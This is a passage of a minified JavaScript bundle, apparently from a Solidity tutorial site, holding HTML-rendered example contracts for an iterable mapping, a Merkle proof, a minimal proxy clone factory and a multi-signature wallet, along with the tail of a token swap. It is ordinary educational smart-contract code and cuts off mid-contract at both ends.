class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner1 || <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner2, <span class="hljs-string">"Not authorized"</span>);\n        <span class="hljs-built_in">require</span>(\n            token1.allowance(owner1, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>)) &gt;= amount1,\n            <span class="hljs-string">"Token 1 allowance too low"</span>\n        );\n        <span class="hljs-built_in">require</span>(\n            token2.allowance(owner2, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>)) &gt;= amount2,\n            <span class="hljs-string">"Token 2 allowance too low"</span>\n        );\n\n        _safeTransferFrom(token1, owner1, owner2, amount1);\n        _safeTransferFrom(token2, owner2, owner1, amount2);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_safeTransferFrom</span>(<span class="hljs-params">\n        IERC20 token,\n        <span class="hljs-keyword">address</span> sender,\n        <span class="hljs-keyword">address</span> recipient,\n        <span class="hljs-keyword">uint</span> amount\n    </span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> </span>{\n        <span class="hljs-keyword">bool</span> sent = token.transferFrom(sender, recipient, amount);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Token transfer failed"</span>);\n    }\n}</code></pre>\n'})};var A=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Iterable Mapping",description:"Iterable Mapping in Solidity",html:'<p>You cannot iterate through a <code>mapping</code>. So here is an example of how to create an iterable <code>mapping</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">library</span> <span class="hljs-title">IterableMapping</span> </span>{\n    <span class="hljs-comment">// Iterable mapping from address to uint;</span>\n    <span class="hljs-keyword">struct</span> <span class="hljs-title">Map</span> {\n        <span class="hljs-keyword">address</span>[] keys;\n        <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) values;\n        <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) indexOf;\n        <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">bool</span>) inserted;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">Map <span class="hljs-keyword">storage</span> map, <span class="hljs-keyword">address</span> key</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> map.values[key];\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKeyAtIndex</span>(<span class="hljs-params">Map <span class="hljs-keyword">storage</span> map, <span class="hljs-keyword">uint</span> index</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span></span>) </span>{\n        <span class="hljs-keyword">return</span> map.keys[index];\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params">Map <span class="hljs-keyword">storage</span> map</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> map.keys.<span class="hljs-built_in">length</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params">Map <span class="hljs-keyword">storage</span> map, <span class="hljs-keyword">address</span> key, <span class="hljs-keyword">uint</span> val</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">if</span> (map.inserted[key]) {\n            map.values[key] = val;\n        } <span class="hljs-keyword">else</span> {\n            map.inserted[key] = <span class="hljs-literal">true</span>;\n            map.values[key] = val;\n            map.indexOf[key] = map.keys.<span class="hljs-built_in">length</span>;\n            map.keys.<span class="hljs-built_in">push</span>(key);\n        }\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params">Map <span class="hljs-keyword">storage</span> map, <span class="hljs-keyword">address</span> key</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">if</span> (!map.inserted[key]) {\n            <span class="hljs-keyword">return</span>;\n        }\n\n        <span class="hljs-keyword">delete</span> map.inserted[key];\n        <span class="hljs-keyword">delete</span> map.values[key];\n\n        <span class="hljs-keyword">uint</span> index = map.indexOf[key];\n        <span class="hljs-keyword">uint</span> lastIndex = map.keys.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>;\n        <span class="hljs-keyword">address</span> lastKey = map.keys[lastIndex];\n\n        map.indexOf[lastKey] = index;\n        <span class="hljs-keyword">delete</span> map.indexOf[key];\n\n        map.keys[index] = lastKey;\n        map.keys.<span class="hljs-built_in">pop</span>();\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TestIterableMap</span> </span>{\n    <span class="hljs-keyword">using</span> <span class="hljs-title">IterableMapping</span> <span class="hljs-title"><span class="hljs-keyword">for</span></span> <span class="hljs-title">IterableMapping</span>.<span class="hljs-title">Map</span>;\n\n    IterableMapping.Map <span class="hljs-keyword">private</span> map;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testIterableMap</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        map.set(<span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), <span class="hljs-number">0</span>);\n        map.set(<span class="hljs-keyword">address</span>(<span class="hljs-number">1</span>), <span class="hljs-number">100</span>);\n        map.set(<span class="hljs-keyword">address</span>(<span class="hljs-number">2</span>), <span class="hljs-number">200</span>); <span class="hljs-comment">// insert</span>\n        map.set(<span class="hljs-keyword">address</span>(<span class="hljs-number">2</span>), <span class="hljs-number">200</span>); <span class="hljs-comment">// update</span>\n        map.set(<span class="hljs-keyword">address</span>(<span class="hljs-number">3</span>), <span class="hljs-number">300</span>);\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; map.size(); i++) {\n            <span class="hljs-keyword">address</span> key = map.getKeyAtIndex(i);\n\n            <span class="hljs-built_in">assert</span>(map.get(key) == i * <span class="hljs-number">100</span>);\n        }\n\n        map.remove(<span class="hljs-keyword">address</span>(<span class="hljs-number">1</span>));\n\n        <span class="hljs-comment">// keys = [address(0), address(3), address(2)]</span>\n        <span class="hljs-built_in">assert</span>(map.size() == <span class="hljs-number">3</span>);\n        <span class="hljs-built_in">assert</span>(map.getKeyAtIndex(<span class="hljs-number">0</span>) == <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>));\n        <span class="hljs-built_in">assert</span>(map.getKeyAtIndex(<span class="hljs-number">1</span>) == <span class="hljs-keyword">address</span>(<span class="hljs-number">3</span>));\n        <span class="hljs-built_in">assert</span>(map.getKeyAtIndex(<span class="hljs-number">2</span>) == <span class="hljs-keyword">address</span>(<span class="hljs-number">2</span>));\n    }\n}\n</code></pre>\n'})};var I=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Merkle Tree",description:"Learn about Merkle tree in Solidity",html:'<p>Merkle tree allows you to cryptographically prove that an element is contained</p>\n<p>in a set without revealing the entire set.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MerkleProof</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span>(<span class="hljs-params">\n        <span class="hljs-keyword">bytes32</span>[] <span class="hljs-keyword">memory</span> proof, <span class="hljs-keyword">bytes32</span> root, <span class="hljs-keyword">bytes32</span> leaf, <span class="hljs-keyword">uint</span> index\n    </span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)\n    </span>{\n        <span class="hljs-keyword">bytes32</span> hash = leaf;\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; proof.<span class="hljs-built_in">length</span>; i++) {\n            <span class="hljs-keyword">bytes32</span> proofElement = proof[i];\n\n            <span class="hljs-keyword">if</span> (index % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {\n                hash = <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(hash, proofElement));\n            } <span class="hljs-keyword">else</span> {\n                hash = <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(proofElement, hash));\n            }\n\n            index = index / <span class="hljs-number">2</span>;\n        }\n\n        <span class="hljs-keyword">return</span> hash == root;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TestMerkleProof</span> <span class="hljs-keyword">is</span> <span class="hljs-title">MerkleProof</span> </span>{\n    <span class="hljs-keyword">bytes32</span>[] <span class="hljs-keyword">public</span> hashes;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-keyword">string</span>[<span class="hljs-number">4</span>] <span class="hljs-keyword">memory</span> transactions = [\n            <span class="hljs-string">"alice -&gt; bob"</span>,\n            <span class="hljs-string">"bob -&gt; dave"</span>,\n            <span class="hljs-string">"carol -&gt; alice"</span>,\n            <span class="hljs-string">"dave -&gt; bob"</span>\n        ];\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; transactions.<span class="hljs-built_in">length</span>; i++) {\n            hashes.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(transactions[i])));\n        }\n\n        <span class="hljs-keyword">uint</span> n = transactions.<span class="hljs-built_in">length</span>;\n        <span class="hljs-keyword">uint</span> offset = <span class="hljs-number">0</span>;\n\n        <span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>) {\n            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i+=<span class="hljs-number">2</span>) {\n                hashes.<span class="hljs-built_in">push</span>(\n                    <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(\n                        hashes[offset + i],\n                        hashes[offset + i + <span class="hljs-number">1</span>]\n                    ))\n                );\n            }\n            offset += n;\n            n = n / <span class="hljs-number">2</span>;\n        }\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRoot</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bytes32</span></span>) </span>{\n        <span class="hljs-keyword">return</span> hashes[hashes.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>];\n    }\n\n    <span class="hljs-comment">/* verify\n    3rd leaf\n    0x1bbd78ae6188015c4a6772eb1526292b5985fc3272ead4c65002240fb9ae5d13\n\n    root\n    0x074b43252ffb4a469154df5fb7fe4ecce30953ba8b7095fe1e006185f017ad10\n\n    index\n    2\n\n    proof\n    0x948f90037b4ea787c14540d9feb1034d4a5bc251b9b5f8e57d81e4b470027af8\n    0x63ac1b92046d474f84be3aa0ee04ffe5600862228c81803cce07ac40484aee43\n    */</span>\n}\n</code></pre>\n'})};var T=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Minimal Proxy Contract",description:"Deploy contracts cheaply with minimal proxy contract",html:'<p>If you have a contract that will be deployed multiple times, use minimal proxy contract to deploy them cheaply.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">// original code</span>\n<span class="hljs-comment">// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.sol</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MinimalProxy</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> target</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span> result</span>) </span>{\n        <span class="hljs-comment">// convert address to 20 bytes</span>\n        <span class="hljs-keyword">bytes20</span> targetBytes = <span class="hljs-keyword">bytes20</span>(target);\n\n        <span class="hljs-comment">// actual code //</span>\n        <span class="hljs-comment">// 3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3</span>\n\n        <span class="hljs-comment">// creation code //</span>\n        <span class="hljs-comment">// copy runtime code into memory and return it</span>\n        <span class="hljs-comment">// 3d602d80600a3d3981f3</span>\n\n        <span class="hljs-comment">// runtime code //</span>\n        <span class="hljs-comment">// code to delegatecall to address</span>\n        <span class="hljs-comment">// 363d3d373d3d3d363d73 address 5af43d82803e903d91602b57fd5bf3</span>\n\n        <span class="hljs-keyword">assembly</span> {\n            <span class="hljs-comment">/*\n            reads the 32 bytes of memory starting at pointer stored in 0x40\n\n            In solidity, the 0x40 slot in memory is special: it contains the "free memory pointer"\n            which points to the end of the currently allocated memory.\n            */</span>\n            <span class="hljs-keyword">let</span> clone := <span class="hljs-built_in">mload</span>(<span class="hljs-number">0x40</span>)\n            <span class="hljs-comment">// store 32 bytes to memory starting at "clone"</span>\n            <span class="hljs-built_in">mstore</span>(clone, <span class="hljs-number">0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000</span>)\n\n            <span class="hljs-comment">/*\n              |              20 bytes                |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000\n                                                      ^\n                                                      pointer\n            */</span>\n            <span class="hljs-comment">// store 32 bytes to memory starting at "clone" + 20 bytes</span>\n            <span class="hljs-comment">// 0x14 = 20</span>\n            <span class="hljs-built_in">mstore</span>(<span class="hljs-built_in">add</span>(clone, <span class="hljs-number">0x14</span>), targetBytes)\n\n            <span class="hljs-comment">/*\n              |               20 bytes               |                 20 bytes              |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe\n                                                                                              ^\n                                                                                              pointer\n            */</span>\n            <span class="hljs-comment">// store 32 bytes to memory starting at "clone" + 40 bytes</span>\n            <span class="hljs-comment">// 0x28 = 40</span>\n            <span class="hljs-built_in">mstore</span>(<span class="hljs-built_in">add</span>(clone, <span class="hljs-number">0x28</span>), <span class="hljs-number">0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000</span>)\n\n            <span class="hljs-comment">/*\n              |               20 bytes               |                 20 bytes              |           15 bytes          |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3\n            */</span>\n            <span class="hljs-comment">// create new contract</span>\n            <span class="hljs-comment">// send 0 Ether</span>\n            <span class="hljs-comment">// code starts at pointer stored in "clone"</span>\n            <span class="hljs-comment">// code size 0x37 (55 bytes)</span>\n            result := <span class="hljs-built_in">create</span>(<span class="hljs-number">0</span>, clone, <span class="hljs-number">0x37</span>)\n        }\n    }\n}\n</code></pre>\n'})};var C=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Multi-Sig Wallet",description:"An example of multi-sig wallet in Solidity",html:'<p>Let&#39;s create an multi-sig wallet. Here are the specifications.</p>\n<p>The wallet owners can</p>\n<ul>\n<li>submit a transaction</li>\n<li>approve and revoke approval of pending transcations</li>\n<li>anyone can execute a transcation after enough owners has approved it.</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">MultiSigWallet</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Deposit</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> sender, <span class="hljs-keyword">uint</span> amount, <span class="hljs-keyword">uint</span> balance</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">SubmitTransaction</span>(<span class="hljs-params">\n        <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner,\n        <span class="hljs-keyword">uint</span> <span class="hljs-keyword">indexed</span> txIndex,\n        <span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> to,\n        <span class="hljs-keyword">uint</span> value,\n        <span class="hljs-keyword">bytes</span> data\n    </span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">ConfirmTransaction</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">uint</span> <span class="hljs-keyword">indexed</span> txIndex</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">RevokeConfirmation</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">uint</span> <span class="hljs-keyword">indexed</span> txIndex</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">ExecuteTransaction</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> owner, <span class="hljs-keyword">uint</span> <span class="hljs-keyword">indexed</span> txIndex</span>)</span>;\n\n    <span class="hljs-keyword">address</span>[] <span class="hljs-keyword">public</span> owners;\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">bool</span>) <span class="hljs-keyword">public</span> isOwner;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> numConfirmationsRequired;\n\n    <span class="hljs-keyword">struct</span> <span class="hljs-title">Transaction</span> {\n        <span class="hljs-keyword">address</span> to;\n        <span class="hljs-keyword">uint</span> value;\n        <span class="hljs-keyword">bytes</span> data;\n        <span class="hljs-keyword">bool</span> executed;\n        <span class="hljs-keyword">uint</span> numConfirmations;\n    }\n\n    <span class="hljs-comment">// mapping from tx index =&gt; owner =&gt; bool</span>\n    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">uint</span> =&gt; <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">bool</span>)) <span class="hljs-keyword">public</span> isConfirmed;\n\n    Transaction[] <span class="hljs-keyword">public</span> transactions;\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">onlyOwner</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-built_in">require</span>(isOwner[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"not owner"</span>);\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">txExists</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>) </span>{\n        <span class="hljs-built_in">require</span>(_txIndex &lt; transactions.<span class="hljs-built_in">length</span>, <span class="hljs-string">"tx does not exist"</span>);\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">notExecuted</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>) </span>{\n        <span class="hljs-built_in">require</span>(!transactions[_txIndex].executed, <span class="hljs-string">"tx already executed"</span>);\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">notConfirmed</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>) </span>{\n        <span class="hljs-built_in">require</span>(!isConfirmed[_txIndex][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"tx already confirmed"</span>);\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span>[] <span class="hljs-keyword">memory</span> _owners, <span class="hljs-keyword">uint</span> _numConfirmationsRequired</span>) </span>{\n        <span class="hljs-built_in">require</span>(_owners.<span class="hljs-built_in">length</span> &gt; <span class="hljs-number">0</span>, <span class="hljs-string">"owners required"</span>);\n        <span class="hljs-built_in">require</span>(\n            _numConfirmationsRequired &gt; <span class="hljs-number">0</span> &amp;&amp; _numConfirmationsRequired &lt;= _owners.<span class="hljs-built_in">length</span>,\n            <span class="hljs-string">"invalid number of required confirmations"</span>\n        );\n\n        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint</span> i = <span class="hljs-number">0</span>; i &lt; _owners.<span class="hljs-built_in">length</span>; i++) {\n            <span class="hljs-keyword">address</span> owner = _owners[i];\n\n            <span class="hljs-built_in">require</span>(owner != <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">"invalid owner"</span>);\n            <span class="hljs-built_in">require</span>(!isOwner[owner], <span class="hljs-string">"owner not unique"</span>);\n\n            isOwner[owner] = <span class="hljs-literal">true</span>;\n            owners.<span class="hljs-built_in">push</span>(owner);\n        }\n\n        numConfirmationsRequired = _numConfirmationsRequired;\n    }\n\n    <span class="hljs-keyword">receive</span>() <span class="hljs-keyword">payable</span> <span class="hljs-keyword">external</span> {\n        <span class="hljs-keyword">emit</span> Deposit(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">submitTransaction</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _to, <span class="hljs-keyword">uint</span> _value, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> _data</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title">onlyOwner</span>\n    </span>{\n        <span class="hljs-keyword">uint</span> txIndex = transactions.<span class="hljs-built_in">length</span>;\n\n        transactions.<span class="hljs-built_in">push</span>(Transaction({\n            to: _to,\n            <span class="hljs-built_in">value:</span> _value,\n            data: _data,\n            executed: <span class="hljs-literal">false</span>,\n            numConfirmations: <span class="hljs-number">0</span>\n        }));\n\n        <span class="hljs-keyword">emit</span> SubmitTransaction(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, txIndex, _to, _value, _data);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">confirmTransaction</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title">onlyOwner</span>\n        <span class="hljs-title">txExists</span>(<span class="hljs-params">_txIndex</span>)\n        <span class="hljs-title">notExecuted</span>(<span class="hljs-params">_txIndex</span>)\n        <span class="hljs-title">notConfirmed</span>(<span class="hljs-params">_txIndex</span>)\n    </span>{\n        Transaction <span class="hljs-keyword">storage</span> transaction = transactions[_txIndex];\n        transaction.numConfirmations += <span class="hljs-number">1</span>;\n        isConfirmed[_txIndex][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-literal">true</span>;\n\n        <span class="hljs-keyword">emit</span> ConfirmTransaction(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _txIndex);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">executeTransaction</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title">onlyOwner</span>\n        <span class="hljs-title">txExists</span>(<span class="hljs-params">_txIndex</span>)\n        <span class="hljs-title">notExecuted</span>(<span class="hljs-params">_txIndex</span>)\n    </span>{\n        Transaction <span class="hljs-keyword">storage</span> transaction = transactions[_txIndex];\n\n        <span class="hljs-built_in">require</span>(\n            transaction.numConfirmations &gt;= numConfirmationsRequired,\n            <span class="hljs-string">"cannot execute tx"</span>\n        );\n\n        transaction.executed = <span class="hljs-literal">true</span>;\n\n        (<span class="hljs-keyword">bool</span> success, ) = transaction.to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> transaction.<span class="hljs-built_in">value</span>}(transaction.data);\n        <span class="hljs-built_in">require</span>(success, <span class="hljs-string">"tx failed"</span>);\n\n        <span class="hljs-keyword">emit</span> ExecuteTransaction(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _txIndex);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">revokeConfirmation</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title">onlyOwner</span>\n        <span class="hljs-title">txExists</span>(<span class="hljs-params">_txIndex</span>)\n        <span class="hljs-title">notExecuted</span>(<span class="hljs-params">_txIndex</span>)\n    </span>{\n        Transaction <span class="hljs-keyword">storage</span> transaction = transactions[_txIndex];\n\n        <span class="hljs-built_in">require</span>(isConfirmed[_txIndex][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"tx not confirmed"</span>);\n\n        transaction.numConfirmations -= <span class="hljs-number">1</span>;\n        isConfirmed[_txIndex][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-literal">false</span>;\n\n        <span class="hljs-keyword">emit</span> RevokeConfirmation(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _txIndex);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getOwners</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span>[] <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> owners;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTransactionCount</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> transactions.<span class="hljs-built_in">length</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTransaction</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _txIndex</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title"><span class="hljs-keyword">view</span></span>\n        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint</span> value, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> data, <span class="hljs-keyword">bool</span> executed, <span class="hljs-keyword">uint</span> numConfirmations</span>)\n    </span>{\n        Transaction <span class="hljs-keyword">storage</span> transaction = transactions[_txIndex];\n\n        <span class="hljs-keyword">return</span> (\n            transaction.to,\n            transaction.<span class="hljs-built_in">value</span>,\n            transaction.data,\n            transaction.executed,\n            transaction.numConfirmations\n        );\n    }\n}\n</code></pre>\n<p>Here is a contract to test sending transactions from the multi-sig wallet</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TestContract</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> i;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callMe</span>(<span class="hljs-params"><span 